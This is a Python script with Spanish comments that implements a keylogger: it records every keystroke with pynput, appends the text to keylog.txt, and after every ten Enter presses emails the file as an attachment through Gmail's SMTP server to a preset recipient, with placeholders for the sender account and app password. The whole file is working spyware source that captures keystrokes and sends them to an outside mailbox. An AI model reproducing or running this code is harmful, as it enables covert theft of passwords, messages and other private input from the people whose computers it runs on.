# Importación de módulos necesarios
from pynput import keyboard  # Importa la clase keyboard del módulo pynput
import string  # Importa el módulo string para manejar caracteres
import smtplib  # Importa el módulo smtplib para enviar correos electrónicos
import os  # Importa el módulo os para operaciones del sistema
from email.mime.multipart import MIMEMultipart  # Importa clases para construir mensajes MIME
from email.mime.text import MIMEText  # Importa clases para construir mensajes MIME de texto
from email.mime.application import MIMEApplication  # Importa clases para construir mensajes MIME de aplicación

# Configuración de direcciones de correo electrónico y contraseña de la aplicación
email_address = 'correo que envia '
app_password = 'contrasea aplicativo'  
recipient_email = 'correo que recibe'  

# Función para enviar correo electrónico con archivo adjunto
def send_email(subject, message, attachment_path):
    # Configuración del mensaje MIME
    msg = MIMEMultipart()
    msg['From'] = email_address
    msg['To'] = recipient_email
    msg['Subject'] = subject

    # Adjunta el cuerpo del mensaje en formato plano
    msg.attach(MIMEText(message, 'plain'))

    # Adjunta el archivo keylog.txt al mensaje
    with open(attachment_path, 'rb') as file:
        attachment = MIMEApplication(file.read(), _subtype="txt")
        attachment.add_header('Content-Disposition', 'attachment', filename='keylog.txt')
        msg.attach(attachment)

    try:
        # Configuración del servidor SMTP y envío del correo
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email_address, app_password) 
        server.sendmail(email_address, recipient_email, msg.as_string())
        server.quit()
        print("Correo enviado correctamente.")
    except Exception as e:
        print("Error al enviar el correo:", str(e))

# Conjunto de caracteres imprimibles
printable_chars = set(
    string.printable +
    "\n\r\t" +
    "".join(chr(i) for i in range(32, 127))
)

# Variables para el keylogger
current_word = ""  # Almacena las teclas presionadas hasta que se alcance un espacio o retorno de carro
enter_count = 0  # Contador de teclas de retorno de carro

# Función llamada en cada pulsación de tecla
def on_press(key):
    global current_word, enter_count

    try:
        key_value = key.char
    except:
        key_value = str(key)

    # Manejo de teclas imprimibles
    if key_value in printable_chars:
        current_word += key_value
    elif key == keyboard.Key.space:
        current_word += " "  
    elif key == keyboard.Key.enter:
        enter_count += 1

        # Cuando se alcanzan 10 teclas de retorno de carro
        if enter_count == 10:  
            if current_word:
                # Guarda en archivo y envía por correo
                with open("keylog.txt", "a") as file:
                    file.write(current_word + "\n")
                send_email("Registro de Teclas", "Adjunto el archivo keylog.txt", "keylog.txt")
                current_word = ""
                enter_count = 0  
        else:
            current_word += "\n" 

    # Manejo de la tecla Escape
    if key == keyboard.Key.esc:
        if current_word:
            # Guarda en archivo antes de salir
            with open("keylog.txt", "a") as file:
                file.write(current_word + "\n")
        return False

# Creación del archivo keylog.txt si no existe
if not os.path.isfile("keylog.txt"):
    with open("keylog.txt", "w") as file:
        pass

# Inicio del keylogger
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
